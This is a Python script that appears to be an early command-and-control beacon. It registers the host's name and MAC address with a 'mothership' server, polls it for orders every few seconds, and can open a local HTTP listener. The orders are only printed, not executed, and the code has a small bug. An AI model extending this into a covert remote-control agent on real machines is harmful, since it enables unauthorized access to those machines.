from  http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
import threading
import http.client
import uuid
import socket
import time

MAC = uuid.getnode()
HOSTNAME = socket.gethostname()

DEFAULT_MOTHERSHIP_ADDRESS = "127.0.0.1"
DEFAULT_MOTHERSHIP_PORT = 8000

LOCAL_ADDRESS = "127.0.0.1"
LOCAL_PORT = 8001
LOCAL_COMMS = False

DEFAULT_DURATION = 5

LAST_COMMAND_ID = "NONE"
LAST_RESULT = "NONE"

def main():

    r = register()
    print(r)

    while True:
        orders = phone_home()
        print(orders)

        if LOCAL_COMMS:
            if local_comms_thread.is_alive():
                print('LOCAL COMMS ARE OPEN')
            else:
                local_comms_thread = open_local_comms(LOCAL_ADDRESS, LOCAL_PORT)

        time.sleep(DEFAULT_DURATION)
    
        
def register():

    params = f'{{"sid": "{HOSTNAME}-{MAC}", "hostname": "{HOSTNAME}", "mac": "{MAC}"}}'
    response =  send_post_to_mothership("/squids/register/", params)
    return response
    
def phone_home():

    params = f'{{"sid": "{HOSTNAME}-{MAC}", "cid": "{LAST_COMMAND_ID}", "result": "{LAST_RESULT}"}}'
    response = send_post_to_mothership("/squids/home/", params)
    return response

def open_local_comms(local_ip, local_port):

    local_channel_server = ThreadingHTTPServer((LOCAL_ADDRESS, LOCAL_PORT), LocalHandler)
    local_channel_thread = threading.Thread(target=local_channel_server.serve_forever)
    local_channel_thread.daemon = True
    local_channel_thread.start()
    
    return local_channel_thread


def send_post_to_mothership(endpoint, params):

    headers = {"Content-Type": "application/json", "Content-Length": len(params)}

    conn = http.client.HTTPConnection(DEFAULT_MOTHERSHIP_ADDRESS, DEFAULT_MOTHERSHIP_PORT)
    try:
        conn.request("POST", endpoint, params, headers)
        r = conn.getresponse()
        return r.read().decode()
    except ConnectionRefusedError as err:
        return err


class LocalHandler(BaseHTTPRequestHandler):

    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()

    def do_GET(self):
        self._set_headers()
        message = threading.current_thread().name
        self.wfile.write(message.encode())
        self.wfile.write('\n'.encode())
        return

    def do_POST(self):
        
        content_length = int(self.headers.get("Content-Length"))
        body = self.rfile.read(content_length)
        print(body.decode())

        self._set_headers()
        return


if __name__ == "__main__":
    main()